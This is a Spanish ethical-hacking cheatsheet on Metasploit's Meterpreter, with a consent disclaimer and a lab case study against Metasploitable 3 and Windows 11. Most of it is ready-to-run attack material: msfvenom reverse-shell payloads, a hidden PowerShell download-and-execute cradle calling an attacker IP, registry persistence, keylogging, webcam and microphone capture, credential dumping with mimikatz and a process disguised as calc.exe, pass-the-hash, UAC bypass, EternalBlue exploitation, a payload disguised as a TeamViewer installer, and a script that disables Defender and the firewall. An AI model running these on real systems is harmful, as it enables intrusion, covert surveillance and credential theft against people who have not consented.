
# Meterpreter

{% hint style="danger" %}
**Nota:** Vamos a conseguir información sensible y ganar persistencia en sistemas, por lo que no podemos utilizar estas técnicas sin un consentimiento o aprobación por parte del objetivo
{% endhint %}

## <mark style="color:purple;">Cheatsheet</mark>

<table data-header-hidden><thead><tr><th width="236"></th><th></th></tr></thead><tbody><tr><td><strong>Comando</strong></td><td><strong>Descripción</strong></td></tr><tr><td><code>help</code></td><td>Mostrar comandos disponibles</td></tr><tr><td><code>sessions -u &#x3C;session></code></td><td>Actualizar shell normal a Meterpreter con sessions</td></tr><tr><td><code>sysinfo</code></td><td>Mostrar información del sistema</td></tr><tr><td><code>getuid</code></td><td>Ver que usuario somos</td></tr><tr><td><code>ps</code></td><td>Enumerar procesos corriendo</td></tr><tr><td><code>getpid</code></td><td>Mostrar proceso actual</td></tr><tr><td><code>migrate &#x3C;PID></code></td><td>Migrar a otro proceso</td></tr><tr><td><code>steal token &#x3C;PID></code></td><td>Robar token de autenticación del proceso</td></tr><tr><td><code>upload &#x3C;LOCAL_PATH> C:\\Program\Files\\binary.exe</code></td><td>Subir un archivo a <code>C:\Program Files\binary.exe</code></td></tr><tr><td><code>download &#x3C;FILE_PATH></code></td><td>Descargar archivo</td></tr><tr><td><code>reg &#x3C;COMMAND></code></td><td>Interactuar con el registro (el registro por sí solo enumerará la sintaxis)</td></tr><tr><td><code>rev2self</code></td><td>Volver al usuario original</td></tr><tr><td><code>shell</code></td><td>Iniciar una shell interactiva</td></tr><tr><td><code>background</code></td><td>Llevar al Background la sesión actual para interactuar con msfconsole</td></tr><tr><td><code>keyscan_start</code></td><td>Iniciar keylogger</td></tr><tr><td><code>keyscan_stop</code></td><td>Detener keylogger</td></tr><tr><td><code>keyscan_dump</code></td><td>Dump keylogger</td></tr><tr><td><code>execute -f cmd.exe -i</code></td><td>Iniciar <code>cmd.exe</code> y interactuar</td></tr><tr><td><code>execute -f cmd.exe -i -H -t</code></td><td>Ejecutar <code>cmd.exe</code> como proceso oculto y con todos los tokens</td></tr><tr><td><code>hashdump</code></td><td>Dump de Hashes locales (Necesita privilegios)</td></tr><tr><td><code>lsa_dump_sam</code></td><td>Dump de la SAM Local en Windows (Necesita privilegios)</td></tr><tr><td><code>lsa_dump_secrets</code></td><td>Dump de LSA Secrets</td></tr><tr><td><code>run &#x3C;SCRIPT></code></td><td>Ejecutar script (<code>/scripts/meterpreter</code> )</td></tr><tr><td><code>screengrab</code></td><td>Ejecutar plugin para hacer una capturas de pantalla de la sesión del usuario</td></tr><tr><td><code>screenshot</code></td><td>Captura de pantalla</td></tr><tr><td><code>screenshare</code></td><td>Compartir pantalla en tiempo real </td></tr></tbody></table>

***

## <mark style="color:purple;">Generación del payload</mark> <a href="#user-content-generate-a-meterpreter" id="user-content-generate-a-meterpreter"></a>

Hay varias formas con las que podemos conseguir una sesión de Meterpreter cómo:

* Explotar una vulnerabilidad con un módulo de Metasploit (p.e. EternalBlue) - No necesitamos credenciales o acceso inicial
* Generar un payload con Msfvenom y abrir un listener multi/handler - Necesitamos acceso inicial para enviar el payload y ejecutarlo
* Usar el módulo `web_delivery` y copiar el payload en el objetivo - Necesitamos acceso a la terminal del objetivo para ejecutar el payload

### Generar un Meterpreter con Msfvenom <a href="#user-content-generate-a-meterpreter" id="user-content-generate-a-meterpreter"></a>

En función del objetivo elegiremos un tipo de arquitectura, payload y ejecutable final:

```sh
# Linux
msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST="10.10.10.110" LPORT=4444 -f elf > shell.elf

# Windows
msfvenom -p windows/meterpreter/reverse_tcp LHOST="10.10.10.110" LPORT=4444 -f exe > shell.exe
msfvenom -p windows/meterpreter/reverse_tcp LHOST="10.10.10.110" LPORT=4444 -f asp > shell.asp

# MacOS
msfvenom -p osx/x86/shell_reverse_tcp LHOST="10.10.10.110" LPORT=4444 -f macho > shell.macho

# PHP
msfvenom -p php/meterpreter_reverse_tcp LHOST="10.10.10.110" LPORT=4444 -f raw > shell.php; cat shell.php | pbcopy && echo '<?php ' | tr -d '\n' > shell.php && pbpaste >> shell.php

# Java
msfvenom -p java/jsp_shell_reverse_tcp LHOST="10.10.10.110" LPORT=4444 -f raw > shell.jsp
msfvenom -p java/jsp_shell_reverse_tcp LHOST="10.10.10.110" LPORT=4444 -f war > shell.war

# Unix - Python, Bash o Perl
msfvenom -p cmd/unix/reverse_python LHOST="10.10.10.110" LPORT=4444 -f raw > shell.py
msfvenom -p cmd/unix/reverse_bash LHOST="10.10.10.110" LPORT=4444 -f raw > shell.sh
msfvenom -p cmd/unix/reverse_perl LHOST="10.10.10.110" LPORT=4444 -f raw > shell.pl
```

También podríamos usar MsfBuild para automatizar este proceso y añadir encriptación adicional, efectivo para bypassear antivirus:

{% embed url="<https://github.com/afsh4ck/MSF-Build>" %}

### Meterpreter Web Delivery <a href="#user-content-meterpreter-webdelivery" id="user-content-meterpreter-webdelivery"></a>

El módulo `web_delivery` de Metasploit es muy versátil y se usa principalmente para obtener ejecución remota de código (RCE) en una máquina víctima mediante la entrega de scripts por HTTP(S). Los diferentes **targets** representan distintos lenguajes o métodos compatibles con el sistema objetivo para ejecutar el payload.

Web Delivery nos genera un comando que debemos ejecutar en la máquina objetivo, facilitando el acceso remoto con menos intervención por parte del objetivo.

{% hint style="success" %}
Esta técnica es efectiva cuando **ya hemos ganado una shell** en un objetivo y queremos migrar a una shell Meterpreter más estable.
{% endhint %}

```bash
msfconsole -q -x "use exploit/multi/script/web_delivery; set TARGET 2; set payload windows/x64/meterpreter/reverse_http; set LHOST <IP-ATACANTE>; set LPORT 4444; run"
```

```bash
use exploit/multi/script/web_delivery
msf6 exploit(multi/script/web_delivery) > show targets

Exploit targets:
=================

    Id  Name
    --  ----
=>  0   Python                    # Python en el objetivo
    1   PHP                       # PHP en el objetivo
    2   PSH                       # Powershell
    3   Regsvr32                  # Bypass de UAC y AMSI (Windows)
    4   pubprn                    # Abusa del servicio pubprn.vbs (Windows antiguos)
    5   SyncAppvPublishingServer  # Bypass de restricciones de ejecución, AppLocker... (Windows)
    6   PSH (Binary)              # Ejecutable Powershell
    7   Linux                     # Payload compatible con Linux
    8   Mac OS X                  # Payload compatible con MacOS

set TARGET 2
set payload windows/x64/meterpreter/reverse_http
set LHOST <IP-ATACANTE>
set LPORT 4445
run
```

Eso nos genera el siguiente comando, que al ejecutarlo en la máquina objetivo nos devuelve una conexión de Meterpreter automáticamente:

{% code overflow="wrap" %}

```bash
powershell.exe -nop -w hidden -c $g=new-object net.webclient;$g.proxy=[Net.WebRequest]::GetSystemWebProxy();$g.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials;IEX $g.downloadstring('http://<IP-ATACANTE>:4445/rYDPPB');
```

{% endcode %}

### Ver módulos de Metasploit disponibles

{% code title="En Kali" %}

```bash
ls /usr/share/metasploit-framework/modules/
```

{% endcode %}

Podemos usar todos estos módulos desde Meterpreter con el comando `run`:

{% code title="En Meterpreter" %}

```bash
run post/linux/gather/enum_network
```

{% endcode %}

***

## <mark style="color:purple;">Técnicas con Meterpreter</mark> <a href="#user-content-get-system" id="user-content-get-system"></a>

### Persistencia con Meterpreter <a href="#user-content-persistence-startup" id="user-content-persistence-startup"></a>

El módulo **`persistence`** se utiliza para **mantener acceso persistente** a una máquina comprometida, incluso después de reinicios.

```bash
meterpreter > help exploit/windows/local/persistence

-A        Automatically start a matching exploit/multi/handler to connect to the agent
-L <opt>  Location in target host to write payload to, if none %TEMP% will be used.
-P <opt>  Payload to use, default is windows/meterpreter/reverse_tcp.
-S        Automatically start the agent on boot as a service (with SYSTEM privileges)
-T <opt>  Alternate executable template to use
-U        Automatically start the agent when the User logs on
-X        Automatically start the agent when the system boots
-h        This help menu
-i <opt>  The interval in seconds between each connection attempt
-p <opt>  The port on which the system running Metasploit is listening
-r <opt>  The IP of the system running Metasploit listening for the connect back
```

```bash
meterpreter > run exploit/windows/local/persistence -U -p 4242
```

Este comando:

1. **Crea un payload** (`reverse_tcp` por defecto) y lo guarda en `%TEMP%`.
2. **Modifica el registro** para ejecutarse al **inicio de sesión del usuario actual** (`HKCU\...\Run`).
3. **Intenta reconectarse** al atacante por el puerto `4242` cada `5 segundos` (valor por defecto).

También podemos llevar la session al background y ejecutarlo desde msfconsole para tener un poco más de info:

```bash
meterpreter > bg

msf6 > use exploit(windows/local/persistence)
msf6 exploit(windows/local/persistence) > set session 1
msf6 exploit(windows/local/persistence) > set exe_name win_update
msf6 exploit(windows/local/persistence) > run

[*] Running persistent module against VAGRANT-2008R2 via session ID: 1
[!] Note: Current user is SYSTEM & STARTUP == USER. This user may not login often!
[+] Persistent VBS script written on VAGRANT-2008R2 to C:\Windows\TEMP\IGGPka.vbs
[*] Installing as HKCU\Software\Microsoft\Windows\CurrentVersion\Run\vwXBfc
[-] Failed to make entry in the registry for persistence
```

<figure><img src="/files/m4MXg7bEr52j9IlvTUEB" alt=""><figcaption></figcaption></figure>

{% hint style="warning" %}
Si este módulo no consigue crear la **entrada en el registro** no conseguiremos la reconexión automática
{% endhint %}

**Verificar persistencia en Windows**:

```powershell
reg query HKCU\Software\Microsoft\Windows\CurrentVersion\Run
```

**Eliminar persistencia manualmente**:

```powershell
reg delete HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v <NombreDelPayload> /f
```

**Configurar handler manualmente** (si no se usa la opción `-A`):

```bash
use exploit/multi/handler
set payload windows/meterpreter/reverse_tcp
set LHOST <IP-ATACANTE>
set LPORT 4242
run
```

#### **Ejemplo Avanzado (Persistencia como Servicio + Auto-handler)**

```bash
run exploit/windows/local/persistence -S -U -i 20 -p 5353 -r <IP-ATACANTE> -A
```

* **Persistencia como servicio (`-S`)** + ejecución al loguearse (`-U`).
* **Reconexión cada 20 segundos (`-i 20`)** al puerto `5353`.
* **Configura automáticamente el auto-handler (`-A`)**.

```bash
msf6 exploit(multi/handler) > set lport 5353
msf6 exploit(multi/handler) > run
[*] Started reverse TCP handler on 192.168.1.156:5353 
[*] 192.168.1.226 - Meterpreter session 1 open

meterpreter >
```

### Monitorizar una red <a href="#user-content-network-monitoring" id="user-content-network-monitoring"></a>

Podemos monitorizar el tráfico de la red del equipo comprometido usando sniffer. El módulo `sniffer` permite capturar paquetes directamente desde la máquina víctima sin necesidad de herramientas externas.

```bash
meterpreter > use sniffer           # Carga el módulo sniffer
meterpreter > sniffer_interfaces    # Lista interfaces de red disponibles
meterpreter > sniffer_start 1       # Inicia captura en la interfaz 1
meterpreter > sniffer_dump 1 /tmp/captura.pcap  # Guarda la captura en un archivo .pcap
meterpreter > sniffer_stats 1       # Muestra estadísticas de tráfico
meterpreter > sniffer_stop 1        # Detiene la captura
```

#### Captura del archivo pcap

```bash
meterpreter > use sniffer
Loading extension sniffer...Success.
meterpreter > sniffer_interfaces

1 - 'WAN Miniport (Network Monitor)' ( type:3 mtu:1514 usable:true dhcp:false wifi:false )
2 - 'Intel(R) PRO/1000 MT Network Connection' ( type:0 mtu:1514 usable:true dhcp:true wifi:false )

meterpreter > sniffer_start 2
[*] Capture started on interface 2 (50000 packet buffer)

[*] Capture statistics for interface 2
	packets: 246
	bytes: 73112

meterpreter > sniffer_dump 2 /home/kali/Escritorio/machines/metasploitable.pcap
[*] Flushing packet capture buffer for interface 2...
[*] Flushed 256 packets (80836 bytes)
[*] Downloaded 100% (80836/80836)...
[*] Download completed, converting to PCAP...
[*] PCAP file written to /home/kali/Escritorio/machines/metasploitable.pcap
```

### Port forwarding <a href="#user-content-portforward" id="user-content-portforward"></a>

El comando `portfwd` en **Meterpreter** se utiliza para crear un **túnel de reenvío de puertos (port forwarding)**, permitiendo acceder a servicios internos en una red remota a través de tu máquina local.

```bash
portfwd add -l 7777 -r 172.17.0.2 -p 3006     # Añadir regla
portfwd delete -l 7777 -r 172.17.0.2 -p 3006  # Eliminar regla
```

<table><thead><tr><th width="165.01171875">Parámetro</th><th>Descripción</th></tr></thead><tbody><tr><td><strong><code>portfwd add</code></strong></td><td>Añade una nueva regla de reenvío de puertos.</td></tr><tr><td><strong><code>-l 7777</code></strong></td><td>(<strong>Local port</strong>) Puerto en tu máquina atacante que recibirá las conexiones.</td></tr><tr><td><strong><code>-r 172.17.0.2</code></strong></td><td>(<strong>Remote host</strong>) IP del servidor interno en la red de la víctima.</td></tr><tr><td><strong><code>-p 3006</code></strong></td><td>(<strong>Remote port</strong>) Puerto interno al que se redirigirá el tráfico.</td></tr></tbody></table>

### Descargar y subir archivos <a href="#user-content-upload--download" id="user-content-upload--download"></a>

```bash
upload /<ruta en kali>/payload.exe exploit.exe
download /<ruta en el objetivo>/secret.txt
```

### Conseguir credenciales en Windows

El módulo **`credential_collector`** en Meterpreter es un **script de post-explotación** diseñado para **recolectar automáticamente credenciales almacenadas** en un sistema Windows comprometido. Funciona como un "todo en uno" para extraer contraseñas, hashes, tickets y otros datos sensibles de múltiples fuentes.

{% code title="En Meterpreter" %}

```
run post/windows/gather/credentials/credential_collector
```

{% endcode %}

### Execute from Memory <a href="#user-content-execute-from-memory" id="user-content-execute-from-memory"></a>

Meterpreter permite ejecutar un binario y ocultar el proceso con el nombre de otro binario legítimo. En el siguiente ejemplo extraeremos credenciales y hashes con `wce.exe`, si no tienes descárgalo de su repositorio oficial:

{% embed url="<https://www.ampliasecurity.com/research/windows-credentials-editor/>" %}

Primero lo cargamos en Meterpreter desde Kali Linux:

```bash
upload /usr/share/windows-resources/wce/wce.exe C:\\Windows\\Temp\\
```

```bash
execute -H -i -f C:\\Windows\\Temp\\wce.exe -a "-o creds.txt" -d calc.exe -m
```

<table><thead><tr><th width="181.57421875">Parámetro</th><th>Descripción</th></tr></thead><tbody><tr><td><strong><code>-H</code></strong></td><td>Crea el proceso oculto (evita que aparezca en el administrador de tareas).</td></tr><tr><td><strong><code>-i</code></strong></td><td>Interactúa con el proceso (asigna un canal para entrada/salida).</td></tr><tr><td><strong><code>-f /root/wce.exe</code></strong></td><td>Ejecuta el archivo <code>wce.exe</code> (Windows Credentials Editor, herramienta para extraer credenciales en Windows).</td></tr><tr><td><strong><code>-a "&#x3C;argumento>"</code></strong></td><td>Argumentos para <code>wce.exe</code> (Por ejemplo lo guardamos en <code>creds.txt</code>).</td></tr><tr><td><strong><code>-d calc.exe</code></strong></td><td><strong>Descripción falsa</strong>, el proceso aparece como <code>calc.exe</code> (calculadora) en el administrador de tareas para evadir detección.</td></tr><tr><td><strong><code>-m</code></strong></td><td>Ejecuta el proceso en memoria (evita escribir en disco, técnica <em>fileless</em>).</td></tr></tbody></table>

Por último nos descargamos el archivo con las credenciales del sistema:

```
download C:\\Windows\\Temp\\creds.txt
```

### Mimikatz <a href="#user-content-mimikatz" id="user-content-mimikatz"></a>

Meterpreter permite cargar la herramienta de Mimikatz directamente desde su interfaz, conocido también como `kiwi` (por el icono del ejecutable):

```
load kiwi
help kiwi
```

```bash
kiwi_cmd -f version
kiwi_cmd -f privilege::debug
kiwi_cmd -f token::elevate
kiwi_cmd -f lsadump::sam
kiwi_cmd -f sekurlsa::logonPasswords
```

Puedes consultar la siguiente sección para información más detallada sobre Mimikatz:

{% content-ref url="/pages/70NwMwXRHfmXF0k8lCe0" %}
[Mimikatz](/ethical-hacking-cheatsheet/post-explotacion/post-explotacion/mimikatz.md)
{% endcontent-ref %}

### Pass the Hash - PSExec <a href="#user-content-pass-the-hash---psexec" id="user-content-pass-the-hash---psexec"></a>

```python
msf > use exploit/windows/smb/psexec
msf exploit(psexec) > set payload windows/meterpreter/reverse_tcp
msf exploit(psexec) > exploit
SMBDomain             WORKGROUP                                                          no        The Windows domain to use for authentication
SMBPass               598ddce2660d3193aad3b435b51404ee:2d20d252a479f485cdf5e171d93985bf  no        The password for the specified username
SMBUser               Lambda    
```

### Mover sesión a una shell

{% code title="Ejemplo en Windows" overflow="wrap" %}

```bash
shell
dir # Ver listado de carpetas
ipconfig # Ver ip local
wlan show profiles # Ver redes wifi conectadas
wlan show profiles name={nombre de la red} key=clear # Contraseña de la red wifi en plano
start cmd # Nos abre una consola
tasklist # Ver todos los procesos en ejecución
taskkill /PID 10000 # Cerrar proceso en ejecución por PID
exit # Nos devuelve a Meterpreter
```

{% endcode %}

### Volcado de hashes de contraseñas

{% hint style="warning" %}
Se necesita permisos de Administrador o SYSTEM
{% endhint %}

```bash
# De forma nativa con Meterpreter
hashdump

# Con el módulo de Metasploit
run post/windows/gather/hashdump 
```

### Acceso a cámaras y micros

```python
webcam_list # Listado de cámaras
webcam_snap 1 # Saca una foto de la cámara que elijamos
webcam_stream 1 # Graba un video de la cámara que elijamos
record_mic # Graba el audio desde el microfono
```

### Keylogger

```python
keyscan # Captura las pulsaciones del teclado.

- Este comando tiene 3 funciones:

keyscan_start # Activa el keylogger
keyscan_dump # Ver lo que se capturo
keyscan_stop # Para el keylogger
```

### Exploit Suggester

**Exploit Suggester** es un módulo utilizado en Metasploit que analiza la versión del sistema operativo y otros datos relevantes en una sesión de Meterpreter activa. Su propósito es sugerir posibles exploits que puedan ser utilizados para comprometer aún más el sistema objetivo, basándose en vulnerabilidades conocidas relevantes para la configuración detectada. Esto facilita el proceso de identificación y ejecución de exploits adecuados dentro de un entorno comprometido.

```python
bg # Llevar sesión de Meterpreter a segundo plano
use post/multi/recon/local_exploit_suggester
set session 1 # Introducir la sesión que tenemos en background
run
```

## <mark style="color:purple;">Escalada de privilegios con Meterpreter</mark>

### Elevar privilegios en Linux

#### Docker Daemon

```python
background # Llevar sesión de Meterpreter a segundo plano
sessions   # Ver todas las sesiones en background
search docker_daemon # Solo para Linux
sessions 1  # Introducir session
exploit
```

### Elevar privilegios en Windows

#### Con `Get System` <a href="#user-content-get-system" id="user-content-get-system"></a>

```bash
meterpreter > getsystem
...got system via technique 1 (Named Pipe Impersonation (In Memory/Admin)).

meterpreter > getuid
Server username: NT AUTHORITY\SYSTEM
```

Si no conseguimos el admin podemos ver todos los módulos de Metasploit para ver cuál nos sirve:

{% code title="En Kali Linux" %}

```bash
ls /usr/share/metasploit-framework/modules/post/windows/
```

{% endcode %}

{% code title="En Meterpreter" %}

```bash
run post/windows/<módulo>
```

{% endcode %}

### Elevar privilegios con UAC Bypass (Windows)

* Partimos con una sesión abierta de Meterpreter en la máquina Windows objetivo
* Llevamos la sesión al background con el comando `bg` o `background`

{% code title="En Metasploit" %}

```sh
search uac
use exploit/windows/local/bypassuac_dotnet_profiler
set session 1
set lhost
set lport # Usar uno distinto al de la session
exploit
getuid
getsystem
#-----------------
Y ya somos root 😎
```

{% endcode %}

***

## <mark style="color:purple;">Caso práctico</mark>

Vamos a poner a prueba Meterpreter contra la máquina `Metasploitable 3 Windows` o contra una máquina `Windows 11 Developer` para probar técnicas de evasión de antivirus:

{% content-ref url="/pages/oeb7yCOm8SMjwlcBGuRB" %}
[Metasploitable 3](/ethical-hacking-cheatsheet/introduccion/ethical-hacking-cheatsheet/instalacion-del-entorno/maquinas-vulnerables/metasploitable-3.md)
{% endcontent-ref %}

{% content-ref url="/pages/Je9uNudbLqx0yR746obF" %}
[Windows 11 Developer](/ethical-hacking-cheatsheet/introduccion/ethical-hacking-cheatsheet/instalacion-del-entorno/maquinas-vulnerables/windows-11-developer.md)
{% endcontent-ref %}

{% hint style="success" %}
**Nota**: Necesitamos tener tanto las máquinas como Kali Linux en modo `Bridge` para que sean accesibles en nuestra red local.
{% endhint %}

### Explotación - EternalBlue

La forma más sencilla de obtener un Meterpreter en la máquina Metasploitable 3 es usar el exploit EternalBlue.

{% hint style="warning" %}
**Nota**: Por defecto usa el puerto `4444`, que debemos tener en cuenta para la persistencia.
{% endhint %}

#### Conectar base de datos de Metasploit

```bash
sudo service postgresql status   # Status de postgresql
sudo systemctl start postgresql  # Iniciar la base de datos postgresql
sudo msfdb init                  # Iniciar la base de datos msfdb
sudo msfdb status                # Status de la base de datos msfdb
sudo msfdb run                   # Conectarse a la base de datos msfdb
```

#### Ejecutar Eternal Blue

<pre class="language-bash"><code class="lang-bash">msf6 > search eternal blue
msf6 exploit(windows/smb/ms17_010_eternalblue) > set rhosts 192.168.1.226
rhosts => 192.168.1.226
msf6 exploit(windows/smb/ms17_010_eternalblue) > exploit

[*] Started reverse TCP handler on 192.168.1.156:4444 
[*] 192.168.1.226:445 - Using auxiliary/scanner/smb/smb_ms17_010 as check
[+] 192.168.1.226:445     - Host is likely VULNERABLE to MS17-010! - Windows Server 2008 R2 Standard 7601 Service Pack 1 x64 (64-bit)
[*] 192.168.1.226:445     - Scanned 1 of 1 hosts (100% complete)
[+] 192.168.1.226:445 - The target is vulnerable.
[*] 192.168.1.226:445 - Connecting to target for exploitation.
[+] 192.168.1.226:445 - Connection established for exploitation.
[+] 192.168.1.226:445 - Target OS selected valid for OS indicated by SMB reply
[*] 192.168.1.226:445 - CORE raw buffer dump (51 bytes)
[*] 192.168.1.226:445 - 0x00000000  57 69 6e 64 6f 77 73 20 53 65 72 76 65 72 20 32  Windows Server 2
[*] 192.168.1.226:445 - 0x00000010  30 30 38 20 52 32 20 53 74 61 6e 64 61 72 64 20  008 R2 Standard 
[*] 192.168.1.226:445 - 0x00000020  37 36 30 31 20 53 65 72 76 69 63 65 20 50 61 63  7601 Service Pac
[*] 192.168.1.226:445 - 0x00000030  6b 20 31                                         k 1             
[+] 192.168.1.226:445 - Target arch selected valid for arch indicated by DCE/RPC reply
[*] 192.168.1.226:445 - Trying exploit with 12 Groom Allocations.
[*] 192.168.1.226:445 - Sending all but last fragment of exploit packet
[*] 192.168.1.226:445 - Starting non-paged pool grooming
[+] 192.168.1.226:445 - Sending SMBv2 buffers
[+] 192.168.1.226:445 - Closing SMBv1 connection creating free hole adjacent to SMBv2 buffer.
[*] 192.168.1.226:445 - Sending final SMBv2 buffers.
[*] 192.168.1.226:445 - Sending last fragment of exploit packet!
[*] 192.168.1.226:445 - Receiving response from exploit packet
[+] 192.168.1.226:445 - ETERNALBLUE overwrite completed successfully (0xC000000D)!
[*] 192.168.1.226:445 - Sending egg to corrupted connection.
[*] 192.168.1.226:445 - Triggering free of corrupted buffer.
[*] Sending stage (203846 bytes) to 192.168.1.226
[+] 192.168.1.226:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[+] 192.168.1.226:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-WIN-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[+] 192.168.1.226:445 - =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=
[*] Meterpreter session 1 opened (192.168.1.156:4444 -> 192.168.1.226:49287) at 2025-05-23 15:15:42 +0200
<strong>
</strong><strong>meterpreter > getuid
</strong>Server username: NT AUTHORITY\SYSTEM
</code></pre>

### Explotación - Msfvenom payload

{% hint style="warning" %}
Si usamos varias técnicas de explotación contra una máquina elegir puertos distintos para que no entren en conflicto.
{% endhint %}

```bash
msfvenom -p windows/meterpreter/reverse_tcp LHOST="192.168.1.227" LPORT=1234 -f exe > shell.exe

[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x86 from the payload
No encoder specified, outputting raw payload
Payload size: 354 bytes
Final size of exe file: 73802 bytes
```

#### Envío del archivo a la máquina

<pre class="language-bash"><code class="lang-bash"><strong># En Kali Linux
</strong><strong>python3 -m http.server 80
</strong>
# En Metasploitable
wget http://192.168.1.227/shell.exe -o shell.exe
</code></pre>

#### Configuramos multi handler y ejecutamos el payload

```bash
msf6 exploit(multi/handler) > set payload windows/meterpreter/reverse_tcp
msf6 exploit(multi/handler) > setg lhost 192.168.1.226
msf6 exploit(multi/handler) > set lport 1234
msf6 exploit(multi/handler) > run

[*] Started reverse TCP handler on 0.0.0.0:1234 
[*] Sending stage (177734 bytes) to 192.168.1.226
[*] Meterpreter session 1 opened (192.168.1.227:1234 -> 192.168.1.226:49813) at 2025-05-23 18:16:19 +0200

meterpreter > getuid
Server username: VAGRANT-2008R2\vagrant
```

### Evasión de antivirus

Vamos a ejecutar el payload creado con Msfvenom contra la máquina Windows 11 Developer con el Defender habilitado.

#### Test de conexión

Si no puedes hacer ping desde tu Kali Linux hacia la máquina Windows 11 Developer, probablemente se debe a la **configuración del firewall** de Windows, que **bloquea ICMP (ping) por defecto**, incluso en modo desarrollador. Podemos deshabilitarlo con el siguiente comando en una Powershell cómo administrador:

```powershell
New-NetFirewallRule -DisplayName "Allow ICMPv4-In" -Protocol ICMPv4 -Direction Inbound -Action Allow
```

El payload que hemos generado antes es **detectado por la mayoría de los antivirus modernos** (incluido Windows Defender), porque es un payload *estándar*, sin ofuscación, sin encoding, ni técnicas de evasión.

Al descargarlo, incluso sin ejecutarlo vemos rápidamente que el Defender lo bloquea:

<figure><img src="/files/zVs5OQKosoiKm1oZ1BCL" alt=""><figcaption></figcaption></figure>

Para evadirlo usaremos GreatSCT,  que genera payloads compatibles con MetaSploit para bypassear defensas.

{% embed url="<https://github.com/GreatSCT/GreatSCT>" %}

#### Instalación

```bash
apt-get -y install git
git clone https://github.com/GreatSCT/GreatSCT.git
cd GreatSCT/
cd setup
sudo ./setup.sh -c
```

<pre class="language-bash"><code class="lang-bash">sudo python3 GreatSCT.py
<strong>
</strong><strong>===============================================================================
</strong>                             GreatSCT | [Version]: 1.0
===============================================================================
      [Web]: https://github.com/GreatSCT/GreatSCT | [Twitter]: @ConsciousHacker
===============================================================================

Main Menu

	1 tools loaded

Available Commands:

	exit			Exit GreatSCT
	info			Information on a specific tool
	list			List available tools
	update			Update GreatSCT
	use			Use a specific tool

Main menu choice: 
</code></pre>

```bash
list > use 1
list # Nos muestra los payloads que no detecta windows
     # regasm y regsvcs son dificiles de detectar por los antivirus
use regasm/meterpreter/rev_tcp.py
set lhost IP_KALI
set lport 5555
generate
```

Esno nos genera el payload `TeamViewer-Install.dll` y nos da los pasos para ejecutarlo:

```
[*] Language: regasm
[*] Payload Module: regasm/meterpreter/rev_tcp
[*] DLL written to: /usr/share/greatsct-output/compiled/TeamViewer-Install.dll
[*] Source code written to: /usr/share/greatsct-output/source/TeamViewer-Install.cs
[*] Execute with: C:\Windows\Microsoft.NET\Framework\v4.0.30319\regasm.exe /U TeamViewer-Install.dll
[*] Metasploit RC file written to: /usr/share/greatsct-output/handlers/TeamViewer-Install.rc
```

Nos lo copiamos a una ruta accesible y lo enviamos a la máquina Windows:

```bash
cp /usr/share/greatsct-output/compiled/TeamViewer-Install.dll /home/kali/Escritorio
```

{% hint style="warning" %}
En nuestra prueba en Windows 11 incluso con la evasión de GreatSCT nos **lo detecta el Defender al descargarlo**, por lo que procedemos a deshabilitarlo desde una Powershell como administrador.
{% endhint %}

Podríamos probar otras técnicas de la sección Evasión de Antivirus:

{% content-ref url="/pages/8S7228bkDNukCB9ji4TT" %}
[Evasión de Antivirus](/ethical-hacking-cheatsheet/evasion-de-defensas/deteccion-y-evasion-de-defensas/evasion-de-antivirus.md)
{% endcontent-ref %}

### Deshabilitar Windows Defender

Ejecutar los siguientes comandos en una Powershell como administrador:

{% hint style="success" %}
**Tip**: Puedes copiar todo el contenido y pegarlo en la PowerShell para evitar ir uno por uno
{% endhint %}

```powershell
# Deshabilitar protección en tiempo real
Set-MpPreference -DisableRealtimeMonitoring $true
Set-MpPreference -DisableBehaviorMonitoring $true
Set-MpPreference -DisableBlockAtFirstSeen $true
Set-MpPreference -DisableIOAVProtection $true
Set-MpPreference -DisableScriptScanning $true
Set-MpPreference -DisableIntrusionPreventionSystem $true
Set-MpPreference -DisablePrivacyMode $true

# Deshabilitar el firewall
Set-NetFirewallProfile -Profile Domain -Enabled False
Set-NetFirewallProfile -Profile Private -Enabled False
Set-NetFirewallProfile -Profile Public -Enabled False

# Deshabilitar protección basada en la nube
Set-MpPreference -DisableBehaviorMonitoring $true

# Detener Windows Defender
sc stop WinDefend

# Comando para eliminar definiciones de virus
& "$env:ProgramFiles\Windows Defender\MpCmdRun.exe" -RemoveDefinitions -All
```

{% hint style="info" %}
Para *habilitarlo de nuevo* solo tenemos que introducir los mismos comandos terminado en `$false`
{% endhint %}

#### Verificar que esta deshabilitado

```powershell
# Comprobar estado
Get-MpComputerStatus | Select-Object RealTimeProtectionEnabled, AntivirusEnabled, AMServiceEnabled

# Verificar servicio
Get-Service WinDefend | Select-Object Status, StartType

# Comprobar políticas
Get-ItemProperty "HKLM:\SOFTWARE\Policies\Microsoft\Windows Defender"

RealTimeProtectionEnabled AntivirusEnabled AMServiceEnabled
------------------------- ---------------- ----------------
                    False             True             True
```

Observamos que el estado `AntivirusEnabled: True` persiste tras desactivar componentes debido a:

1. **Arquitectura en Capas**
   * Solo se desactivan funciones periféricas (ej: monitoreo en tiempo real)
   * El núcleo del antivirus permanece activo por diseño
2. **Tamper Protection** (Protección contra manipulaciones)

   * Bloquea cambios no autorizados en la configuración
   * Activado por defecto en Windows 10/11
   * Requiere deshabilitación manual en:

   ```bash
   Configuración > Seguridad > Protección contra manipulaciones
   ```

#### **Conclusión:**

Una desactivación completa exige:

* Deshabilitar Tamper Protection primero
* Modificar políticas vía registro/GPO
* Reiniciar servicios críticos

{% hint style="danger" %}
*Defender emplea defensas en profundidad que requieren intervenciones específicas para su desactivación total.*
{% endhint %}

#### Descarga del dll malicioso

```bash
wget http://192.168.1.247/TeamViewer-Install.dll -o TeamViewer-Install.dll
```

<figure><img src="/files/A80NcMW7Yo1KOGUjFmUU" alt=""><figcaption></figcaption></figure>

#### Abrir listener y ejecución

```bash
msfconsole -r /usr/share/greatsct-output/handlers/TeamViewer-Install.rc
```

{% code title="En Windows" %}

```powershell
C:\Windows\Microsoft.NET\Framework\v4.0.30319\regasm.exe /U TeamViewer-Install.dll
```

{% endcode %}

